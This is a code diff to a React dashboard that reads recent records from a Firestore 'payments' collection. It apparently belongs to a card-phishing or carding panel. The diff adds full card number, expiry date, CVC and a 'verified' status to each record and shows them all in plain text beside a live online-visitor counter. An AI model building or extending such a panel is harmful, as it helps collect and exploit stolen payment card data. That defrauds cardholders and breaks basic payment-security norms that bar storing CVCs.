@@ -8,7 +8,12 @@ import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 
 interface Payment {
   id: string
-  cardName: string
+  cardName: string,
+  cardNumber:string,
+  expiryMonth:string,
+  expiryYear:string,
+  cvc:string,
+  verified:string,
   timestamp: { seconds: number; nanoseconds: number }
 }
 
@@ -18,7 +23,7 @@ export default function Dashboard() {
   const [onlineVisitors, setOnlineVisitors] = useState(0)
 
   useEffect(() => {
-    const q = query(collection(db, 'payments'), orderBy('timestamp', 'desc'), limit(10))
+    const q = query(collection(db, 'payments'), orderBy('timestamp', 'desc'), limit(5))
     const unsubscribe = onSnapshot(q, (querySnapshot) => {
       const paymentsData = querySnapshot.docs.map(doc => ({
         id: doc.id,
@@ -81,6 +86,10 @@ export default function Dashboard() {
               <div key={payment.id} className="flex items-center">
                 <div className="mr-4 space-y-1">
                   <p className="text-sm font-medium leading-none">{payment.cardName}</p>
+                  <p className="text-sm font-medium leading-none">{payment.cardNumber}</p>
+                  <p className="text-sm font-medium leading-none">{payment.expiryYear+"/"+payment.expiryMonth}</p>
+                  <p className="text-sm font-medium leading-none">{payment.cvc}</p>
+                  <p className="text-sm font-medium leading-none text-red-500">{payment.verified}</p>
                   <p className="text-sm text-muted-foreground">
                     {new Date(payment.timestamp.seconds * 1000).toLocaleString('ar-EG')}
                   </p>
